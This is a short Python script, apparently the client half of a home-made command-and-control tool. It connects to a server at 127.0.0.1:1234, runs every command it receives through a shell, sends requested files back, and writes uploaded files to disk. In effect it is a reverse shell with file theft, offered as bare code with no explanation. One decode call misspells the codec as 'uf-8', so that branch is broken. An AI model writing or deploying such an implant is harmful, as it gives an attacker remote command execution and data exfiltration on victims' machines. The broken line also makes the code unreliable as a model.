import socket
import subprocess
from pathlib import Path

ip_address = '127.0.0.1'
port_number = 1234

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((ip_address, port_number))

# msg = input("Enter command to send :")
msg = 'TEST CLIENT'

cs.send(msg.encode('utf-8', 'ignore'))

msg = cs.recv(1024).decode('utf-8', 'ignore')

while msg != 'quit':
    msg = list(msg.split(" "))
    if msg[0] == 'download':
        filename = msg[1]
        f = open(Path(filename), 'rb')
        contents = f.read()
        f.close()
        cs.send(contents)
        msg = cs.recv(1024).decode('utf-8', 'ignore')
        # download D:\\MyC2\\output\\o.txt

    elif msg[0] == 'upload':
        filename = msg[1]
        filesize = int(msg[2])
        contents = cs.recv(filesize)
        f = open(Path(filename), 'wb')
        f.write(contents)
        f.close()
        cs.send('Got file'.encode('utf-8', 'ignore'))
        msg = cs.recv(1024).decode('uf-8', 'ignore')


    else:
        p = subprocess.Popen(
            msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True
        )
        output, error = p.communicate()
        if len(output) > 0:
            msg = str(output.decode('utf-8', 'ignore'))
        else:
            msg = str(error.decode('utf-8', 'ignore'))
        cs.send(msg.encode('utf-8', 'ignore'))
        msg = cs.recv(1024).decode('utf-8', 'ignore')


cs.close()